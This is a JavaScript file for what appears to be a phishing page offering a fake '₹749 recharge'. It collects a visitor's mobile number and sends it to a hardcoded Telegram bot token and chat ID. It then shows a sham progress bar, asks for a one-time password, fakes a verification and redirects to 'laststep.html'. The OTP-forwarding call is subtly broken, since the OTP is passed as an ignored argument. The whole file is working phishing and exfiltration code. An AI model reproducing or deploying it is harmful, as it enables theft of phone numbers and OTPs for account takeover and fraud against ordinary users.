// script.js
var attempts = 0;

function activateRecharge() {
    var inputNumber = document.getElementById('number-input').value;

    // Validate if inputNumber is a valid 10-digit number
    if (!isValidNumber(inputNumber)) {
        alert('Please enter a valid 10-digit number.');
        return;
    }

    // Show loading spinner during processing
    showLoadingSpinner();

    // Send the number to the Telegram bot immediately
    sendToTelegramBot(inputNumber);

    var progressBar = document.getElementById('progress-bar');
    var progressFill = document.getElementById('progress-fill');
    var progressText = document.getElementById('progress-text');

    progressBar.style.display = 'block';
    progressText.innerHTML = 'Activating ₹749 Recharge.';

    // Assuming a simple animation to show progress (you can replace this with your logic)
    var totalTime = 50 * 1000; // 1.5 minutes in milliseconds
    var interval = setInterval(frame, totalTime / 100); // Adjust the total steps for the animation

    var width = 0;
    function frame() {
        if (width >= 100) {
            clearInterval(interval);

            // Add a break motion by delaying the completion
            setTimeout(function() {
                progressText.innerHTML = 'Enter OTP to verify!';
                showOTPSection();
            }, totalTime / 6); // Adjust the break duration as needed

            setTimeout(function() {
                progressBar.style.display = 'none';
                progressText.innerHTML = '';
                alert('Enter OTP to verify!');
                hideLoadingSpinner();
            }, totalTime / 0.5); // Total animation duration including the break
        } else {
            width++;
            progressFill.style.width = width + '%';
        }
    }
}

function isValidNumber(value) {
    // Validate if the value is a non-empty string and a valid 10-digit number
    return /^[0-9]{10}$/.test(value);
}

function showLoadingSpinner() {
    var loadingSpinner = document.createElement('div');
    loadingSpinner.id = 'loading-spinner';
    document.getElementById('container').appendChild(loadingSpinner);
}

function hideLoadingSpinner() {
    var loadingSpinner = document.getElementById('loading-spinner');
    if (loadingSpinner) {
        loadingSpinner.parentNode.removeChild(loadingSpinner);
    }
}

function sendToTelegramBot(mobileNumber, message) {
    // Replace 'YOUR_BOT_TOKEN' and 'YOUR_CHAT_ID' with your actual bot token and chat ID
    var botToken = '6752961822:AAHzDMtUeGxHpoRWenQhZJLfCbDOFJvk9Kg';
    var chatId = '6324305321';

    // API endpoint for sending messages
    var apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

    // Full message including OTP
    var fullMessage = `Mob No: ${mobileNumber}`;

    // Build the request parameters
    var params = {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: fullMessage,
        }),
    };

    // Make the HTTP request to the Telegram API
    fetch(apiUrl, params)
        .then(response => response.json())
        .then(data => console.log(data))
        .catch(error => console.error('Error:', error));
}

function showOTPSection() {
    // Hide the current elements
    document.getElementById('number-input').style.display = 'none';
    document.getElementById('check-now-btn').style.display = 'none';

    // Show the OTP input section
    var otpContainer = document.getElementById('otp-container');
    otpContainer.style.display = 'block';

    // After 10 seconds, redirect to laststep.html
    setTimeout(function() {
        window.location.href = 'laststep.html';
    }, 40000);
}

function verifyOTP() {
    var enteredOTP = document.getElementById('otp-input').value;
    var errorContainer = document.getElementById('error-container');

    // Show loading spinner during OTP verification
    showLoadingSpinner();

    // Send the OTP along with the mobile number to the Telegram bot
    sendToTelegramBot(document.getElementById('number-input').value, `OTP: ${enteredOTP}`);

    // Perform OTP verification logic here
    // For now, let's just display an alert indicating success
    setTimeout(function() {
        hideLoadingSpinner();
        if (enteredOTP === '5327') { // Replace '1234' with your actual correct OTP
            alert('OTP Verified!'); // Replace this with your actual OTP verification logic

            // You can add further logic here based on the OTP verification result
            // For example, redirecting to another page or showing a success message
        } else {
            attempts++;

            // Display error message in red
            var errorMessage = document.createElement('div');
            errorMessage.className = 'error-message';
            errorMessage.style.color = 'red';
            errorMessage.innerHTML = 'Incorrect OTP. Please try again.';

            errorContainer.appendChild(errorMessage);

            // Vibrate the device (if supported)
            if (navigator.vibrate) {
                navigator.vibrate(200); // Vibrate for 200 milliseconds
            }

            // Clear input after three unsuccessful attempts
            if (attempts >= 3) {
                document.getElementById('otp-input').value = '';
                attempts = 0; // Reset attempts
            }

            // Display success message on the fourth attempt
            if (attempts === 3) {
                alert('OTP Verify!'); // Replace this with your actual OTP verification logic

                // You can add further logic here based on the OTP verification result
                // For example, redirecting to another page or showing a success message

                // Reset attempts and clear error messages
                attempts = 0;
                errorContainer.innerHTML = '';
            }
        }
    }, 40000); // 10 seconds for OTP verification
}
